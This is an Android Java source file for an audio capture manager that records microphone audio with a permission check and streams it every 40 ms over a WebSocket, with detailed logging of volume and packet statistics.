package com.example.omnicontrol.managers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;

import androidx.core.app.ActivityCompat;

// WebSocket和RDT协议相关导入
import com.example.omnicontrol.utils.WebSocketManager;
import com.example.omnicontrol.utils.RDTMessage;
import com.example.omnicontrol.utils.RDTDefine;

import java.util.concurrent.atomic.AtomicLong;

/**
 * 音频捕获管理器
 * 负责录制麦克风音频并实时传输
 */
public class AudioCaptureManager {
    private static final String TAG = "AudioCaptureManager";
    
    // 音频参数
    private static final int SAMPLE_RATE = 44100; // 采样率
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO; // 单声道
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT; // 16位PCM
    
    // 音频包发送间隔（40ms）
    private static final long AUDIO_SEND_INTERVAL = 40;
    
    private Context context;
    private AudioRecord audioRecord;
    private int minBufferSize;
    
    // 后台线程
    private HandlerThread recordingThread;
    private Handler recordingHandler;
    private volatile boolean isRecording = false;
    
    // WebSocket和RDT协议相关
    // WebSocketManager使用单例模式，不需要实例变量
    private boolean enableWebSocketPush = false;
    private Handler audioSendHandler;
    private Runnable audioSendRunnable;
    private byte[] latestAudioData; // 最新的音频数据
    private final Object audioDataLock = new Object(); // 音频数据锁
    
    // 统计信息
    private AtomicLong audioPacketCount = new AtomicLong(0);
    private AtomicLong totalAudioDataSize = new AtomicLong(0);
    
    // 日志输出时间控制
    private long lastLogTime = 0;
    private long lastStatsTime = 0;
    
    // 数据回调接口
    public interface AudioDataCallback {
        void onAudioData(byte[] audioData, int length);
        void onError(String error);
    }
    
    private AudioDataCallback audioDataCallback;
    
    public AudioCaptureManager(Context context) {
        this.context = context;
        initAudioRecord();
    }
    
    /**
     * 初始化AudioRecord
     */
    private void initAudioRecord() {
        try {
            // 获取最小缓冲区大小
            minBufferSize = AudioRecord.getMinBufferSize(
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT
            );
            
            if (minBufferSize == AudioRecord.ERROR || minBufferSize == AudioRecord.ERROR_BAD_VALUE) {
                Log.e(TAG, "❌ 无效的音频缓冲区大小: " + minBufferSize);
                return;
            }
            
            Log.i(TAG, "🎤 音频参数初始化 - 采样率: " + SAMPLE_RATE + "Hz, 缓冲区: " + minBufferSize + " bytes");
            
            // 延迟创建AudioRecord到权限获取后
            
        } catch (Exception e) {
            Log.e(TAG, "❌ 音频参数初始化失败", e);
            audioRecord = null;
        }
    }
    
    /**
     * 创建AudioRecord实例（权限检查后调用）
     */
    private boolean createAudioRecord() {
        try {
            // 检查权限
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) 
                != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "❌ 麦克风权限未授予，无法创建AudioRecord");
                return false;
            }
            
            // 创建AudioRecord
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                minBufferSize * 2 // 使用2倍缓冲区
            );
            
            if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
                Log.i(TAG, "✅ AudioRecord创建成功 - 采样率: " + SAMPLE_RATE + "Hz, 缓冲区: " + (minBufferSize * 2) + " bytes");
                return true;
            } else {
                Log.e(TAG, "❌ AudioRecord初始化失败，状态: " + audioRecord.getState());
                audioRecord.release();
                audioRecord = null;
                return false;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ 创建AudioRecord异常", e);
            if (audioRecord != null) {
                audioRecord.release();
                audioRecord = null;
            }
            return false;
        }
    }
    
    /**
     * 设置音频数据回调
     */
    public void setAudioDataCallback(AudioDataCallback callback) {
        this.audioDataCallback = callback;
    }
    
    /**
     * 启用WebSocket推送（像屏幕共享一样自动开始后台传输）
     */
    public void enableWebSocketPush() {
        Log.i(TAG, "🎤 启用音频WebSocket推送 - 开始后台传输");
        
        // 设置推送标记
        enableWebSocketPush = true;
        
        // 注意：不在这里调用startRecording()防止循环调用
        // 调用方应该先调用startRecording()再调用enableWebSocketPush()
        
        // 启动后台传输定时器（每40ms）
        startAudioSendTimer();
        
        Log.i(TAG, "📡 音频后台传输已启动 - 40ms间隔");
    }
    
    /**
     * 禁用WebSocket推送
     */
    public void disableWebSocketPush() {
        enableWebSocketPush = false;
        stopAudioSendTimer();
        Log.i(TAG, "🔇 禁用音频WebSocket推送");
    }
    
    /**
     * 启动音频定时发送器（每40ms发送一次）
     */
    private void startAudioSendTimer() {
        if (audioSendHandler != null) {
            return;
        }
        
        audioSendHandler = new Handler(android.os.Looper.getMainLooper());
        audioSendRunnable = new Runnable() {
            @Override
            public void run() {
                // 详细检查每个条件状态
                boolean recording = isRecording;
                boolean pushEnabled = enableWebSocketPush;
                WebSocketManager webSocketManager = WebSocketManager.instance();
                boolean managerExists = webSocketManager != null;
                boolean socketConnected = managerExists && webSocketManager.isConnected();
                
                // 每5秒输出一次详细状态（避免日志过多）
                long currentTime = System.currentTimeMillis();
                if (currentTime - lastLogTime > 5000) {
                    Log.i(TAG, String.format("📊 音频推送状态检查 - 录音:%s, 推送开关:%s, 管理器:%s, WebSocket:%s", 
                        recording ? "✅进行中" : "❌已停止",
                        pushEnabled ? "✅启用" : "❌禁用", 
                        managerExists ? "✅存在" : "❌null",
                        socketConnected ? "✅连接" : "❌断开"
                    ));
                    lastLogTime = currentTime;
                }
                
                // 发送音频包（仅在所有条件满足时）
                if (recording && pushEnabled && managerExists && socketConnected) {
                    sendAudioPacket();
                } else if (recording) {
                    // 输出未推送的原因（仅在录音进行但无法推送时）
                    if (!pushEnabled) Log.v(TAG, "⏸️ 音频推送被禁用");
                    if (!managerExists) Log.v(TAG, "⏸️ 音频WebSocket管理器为null");
                    if (!socketConnected) Log.v(TAG, "⏸️ 音频WebSocket未连接");
                }
                
                // 继续下一次发送
                audioSendHandler.postDelayed(this, AUDIO_SEND_INTERVAL);
            }
        };
        
        audioSendHandler.postDelayed(audioSendRunnable, AUDIO_SEND_INTERVAL);
        Log.i(TAG, "⏰ 音频定时发送器启动 - 间隔: " + AUDIO_SEND_INTERVAL + "ms");
    }
    
    /**
     * 停止音频定时发送器
     */
    private void stopAudioSendTimer() {
        if (audioSendHandler != null && audioSendRunnable != null) {
            audioSendHandler.removeCallbacks(audioSendRunnable);
            audioSendHandler = null;
            audioSendRunnable = null;
            Log.i(TAG, "⏸️ 音频定时发送器已停止");
        }
    }
    
    /**
     * 发送音频数据包（通过RDT协议+WebSocket）
     */
    private void sendAudioPacket() {
        synchronized (audioDataLock) {
            if (latestAudioData != null && enableWebSocketPush) {
                // 发送最新的音频数据
                byte[] dataToSend = new byte[latestAudioData.length];
                System.arraycopy(latestAudioData, 0, dataToSend, 0, latestAudioData.length);
                sendAudioData(dataToSend);
            }
        }
    }
    
    /**
     * 发送音频数据（使用WebSocketManager的RDTProtocol）
     */
    private void sendAudioData(byte[] audioData) {
        WebSocketManager webSocketManager = WebSocketManager.instance();
        if (webSocketManager == null || !webSocketManager.isConnected()) {
            Log.v(TAG, "⚠️ 音频数据发送被跳过 - WebSocket未连接");
            return;
        }
        
        try {
            // 使用WebSocketManager的sendAudioData方法，已集成RDTProtocol
            webSocketManager.sendAudioData(audioData);
            
            // 更新统计数据
            long packetNum = audioPacketCount.incrementAndGet();
            totalAudioDataSize.addAndGet(audioData.length);
            
            // 🎤 每个音频包都输出日志（每40ms一次）- 像屏幕共享一样
            Log.i(TAG, String.format("🎤 音频发送 Frame #%d | 大小: %d bytes | 采样率: %d Hz | WebSocket: ✓ | 时间: %dms", 
                   packetNum, audioData.length, SAMPLE_RATE, System.currentTimeMillis() % 100000));
            
            // 每50包输出一次统计数据（约2秒）
            if (packetNum % 50 == 0) {
                long currentTime = System.currentTimeMillis();
                if (lastStatsTime > 0) {
                    float timeDiff = (currentTime - lastStatsTime) / 1000.0f;
                    float packetsPerSec = 50.0f / timeDiff;
                    Log.i(TAG, String.format("📡 音频发送统计 | 包数: %d | 频率: %.1f包/秒 | 累计: %.1f KB", 
                           packetNum, packetsPerSec, totalAudioDataSize.get() / 1024.0f));
                }
                lastStatsTime = currentTime;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "发送音频数据失败: " + e.getMessage(), e);
        }
    }
    public void startRecording() {
        if (isRecording) {
            Log.w(TAG, "🎤 录音已在进行中");
            return;
        }
        
        // 检查权限
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) 
            != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "❌ 麦克风权限未授予");
            if (audioDataCallback != null) {
                audioDataCallback.onError("麦克风权限未授予");
            }
            return;
        }
        
        // 如果AudioRecord未创建，现在创建
        if (audioRecord == null) {
            Log.i(TAG, "📝 权限检查通过，开始创建AudioRecord");
            if (!createAudioRecord()) {
                Log.e(TAG, "❌ AudioRecord创建失败");
                if (audioDataCallback != null) {
                    audioDataCallback.onError("音频录制器创建失败");
                }
                return;
            }
        }
        
        try {
            // WebSocket连接状态检查和初始化
            WebSocketManager webSocketManager = WebSocketManager.instance();
            if (webSocketManager != null) {
                Log.i(TAG, "🌐 WebSocket状态检查 - 连接状态: " + (webSocketManager.isConnected() ? "✅已连接" : "❌断开"));
                
                if (!webSocketManager.isConnected()) {
                    Log.i(TAG, "🔄 尝试重新连接WebSocket...");
                    webSocketManager.connect();
                    
                    // 等待连接建立（最多3秒）
                    new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                        boolean connected = webSocketManager.isConnected();
                        Log.i(TAG, "🔍 WebSocket连接结果: " + (connected ? "✅成功" : "❌失败"));
                        if (connected) {
                            enableWebSocketPush();
                            Log.i(TAG, "🚀 音频WebSocket推送已启用");
                        }
                    }, 3000);
                } else {
                    enableWebSocketPush();
                    Log.i(TAG, "🚀 音频WebSocket推送已启用（现有连接）");
                }
            } else {
                Log.w(TAG, "⚠️ WebSocket管理器为null，音频数据无法推送");
            }
            
            // 启动录音线程
            startRecordingThread();
            
            // 开始录音
            audioRecord.startRecording();
            isRecording = true;
            
            Log.i(TAG, "🎤 音频录制启动成功 - 状态: ✅录音中, WebSocket: " + 
                (WebSocketManager.instance() != null && WebSocketManager.instance().isConnected() ? "✅连接" : "❌断开"));
            
            // 重置统计数据
            audioPacketCount.set(0);
            totalAudioDataSize.set(0);
            lastLogTime = System.currentTimeMillis();
            
        } catch (Exception e) {
            Log.e(TAG, "❌ 启动音频录制失败", e);
            isRecording = false;
            if (audioDataCallback != null) {
                audioDataCallback.onError("启动音频录制失败: " + e.getMessage());
            }
        }
    }
    
    /**
     * 停止录音
     */
    public void stopRecording() {
        if (!isRecording) {
            Log.w(TAG, "Audio recording not started");
            return;
        }
        
        try {
            isRecording = false;
            
            if (audioRecord != null) {
                audioRecord.stop();
            }
            
            stopRecordingThread();
            
            Log.i(TAG, "Audio recording stopped successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping audio recording", e);
        }
    }
    
    /**
     * 启动录音线程
     */
    private void startRecordingThread() {
        recordingThread = new HandlerThread("AudioRecording");
        recordingThread.start();
        recordingHandler = new Handler(recordingThread.getLooper());
        
        // 开始录音任务
        recordingHandler.post(recordingRunnable);
    }
    
    /**
     * 停止录音线程
     */
    private void stopRecordingThread() {
        if (recordingThread != null) {
            recordingThread.quitSafely();
            try {
                recordingThread.join();
                recordingThread = null;
                recordingHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping recording thread", e);
            }
        }
    }
    
    /**
     * 录音任务
     */
    private final Runnable recordingRunnable = new Runnable() {
        @Override
        public void run() {
            byte[] audioBuffer = new byte[minBufferSize];
            
            while (isRecording && audioRecord != null) {
                try {
                    // 读取音频数据
                    int bytesRead = audioRecord.read(audioBuffer, 0, audioBuffer.length);
                    
                    if (bytesRead > 0) {
                        // 处理音频数据
                        processAudioData(audioBuffer, bytesRead);
                    } else if (bytesRead == AudioRecord.ERROR_INVALID_OPERATION) {
                        Log.e(TAG, "AudioRecord read error: invalid operation");
                        break;
                    } else if (bytesRead == AudioRecord.ERROR_BAD_VALUE) {
                        Log.e(TAG, "AudioRecord read error: bad value");
                        break;
                    }
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error reading audio data", e);
                    break;
                }
            }
        }
    };
    
    /**
     * 处理音频数据
     */
    private void processAudioData(byte[] audioData, int length) {
        try {
            // 实时日志输出音频数据信息
            logAudioData(audioData, length);
            
            // 可以在这里进行音频处理，如降噪、压缩等
            
            // 保存最新音频数据供定时发送使用
            synchronized (audioDataLock) {
                if (latestAudioData == null || latestAudioData.length != length) {
                    latestAudioData = new byte[length];
                }
                System.arraycopy(audioData, 0, latestAudioData, 0, length);
            }
            
            // 回调原始音频数据
            if (audioDataCallback != null) {
                // 创建实际长度的数据副本
                byte[] actualData = new byte[length];
                System.arraycopy(audioData, 0, actualData, 0, length);
                audioDataCallback.onAudioData(actualData, length);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing audio data", e);
            if (audioDataCallback != null) {
                audioDataCallback.onError("音频数据处理错误: " + e.getMessage());
            }
        }
    }
    
    /**
     * 实时日志输出音频数据信息
     */
    private void logAudioData(byte[] audioData, int length) {
        if (audioData == null || length <= 0) {
            return;
        }
        
        // 计算音频数据的统计信息
        int maxAmplitude = 0;
        long sum = 0;
        int samples = length / 2; // 16位PCM，每个样本2字节
        
        // 将字节数组转换为short数组进行分析
        for (int i = 0; i < length - 1; i += 2) {
            short sample = (short) ((audioData[i + 1] << 8) | (audioData[i] & 0xFF));
            int amplitude = Math.abs(sample);
            maxAmplitude = Math.max(maxAmplitude, amplitude);
            sum += amplitude;
        }
        
        int avgAmplitude = samples > 0 ? (int) (sum / samples) : 0;
        
        // 计算音量百分比 (0-100%)
        int volumePercent = (int) ((maxAmplitude / 32768.0) * 100);
        
        // 判断音频活动状态
        String activityStatus = volumePercent > 10 ? "🔊有声音" : "🔇静音";
        WebSocketManager webSocketManager = WebSocketManager.instance();
        String websocketStatus = (webSocketManager != null && webSocketManager.isConnected()) ? "✅连接" : "❌断开";
        
        // 📢 每个音频数据包都输出日志（像屏幕共享一样）
        long packetNum = audioPacketCount.incrementAndGet();
        totalAudioDataSize.addAndGet(length);
        
        Log.i(TAG, String.format("🎤 音频数据 Packet #%d | 长度: %d bytes | 样本: %d | 最大振幅: %d | 平均振幅: %d | 音量: %d%% | %s | WebSocket: %s | 时间: %dms", 
            packetNum, length, samples, maxAmplitude, avgAmplitude, volumePercent, activityStatus, websocketStatus, System.currentTimeMillis() % 100000));
            
        // 每50个包输出一次详细统计信息（约2秒，因为40ms间隔）
        if (packetNum % 50 == 0) {
            long currentTime = System.currentTimeMillis();
            if (lastStatsTime > 0) {
                float timeDiff = (currentTime - lastStatsTime) / 1000.0f;
                float packetsPerSec = 50 / timeDiff;
                Log.i(TAG, String.format("📊 音频统计 | 包数: %d | 速率: %.1f包/秒 | 累计: %.1f KB | 采样率: %dHz | 格式: 16位PCM单声道", 
                       packetNum, packetsPerSec, totalAudioDataSize.get() / 1024.0f, SAMPLE_RATE));
            }
            lastStatsTime = currentTime;
        }
    }
    
    /**
     * 获取录音状态
     */
    public boolean isRecording() {
        return isRecording;
    }
    
    /**
     * 获取音频参数信息
     */
    public String getAudioInfo() {
        return String.format("采样率: %d Hz, 声道: %s, 格式: 16位PCM, 缓冲区: %d bytes",
            SAMPLE_RATE,
            CHANNEL_CONFIG == AudioFormat.CHANNEL_IN_MONO ? "单声道" : "立体声",
            minBufferSize);
    }
    
    /**
     * 释放资源（包括WebSocket和AudioRecord）
     */
    public void release() {
        stopRecording();
        
        // 停止音频定时发送器
        disableWebSocketPush();
        
        // 不需要断开WebSocket连接，因为它由PermissionManager管理
        
        // 释放AudioRecord资源
        if (audioRecord != null) {
            try {
                audioRecord.release();
                audioRecord = null;
                Log.i(TAG, "🎤 AudioRecord资源已释放");
            } catch (Exception e) {
                Log.e(TAG, "Error releasing AudioRecord", e);
            }
        }
        
        // 重置统计信息
        audioPacketCount.set(0);
        totalAudioDataSize.set(0);
        
        Log.i(TAG, "🗺️ AudioCaptureManager资源全部释放完成");
    }
}
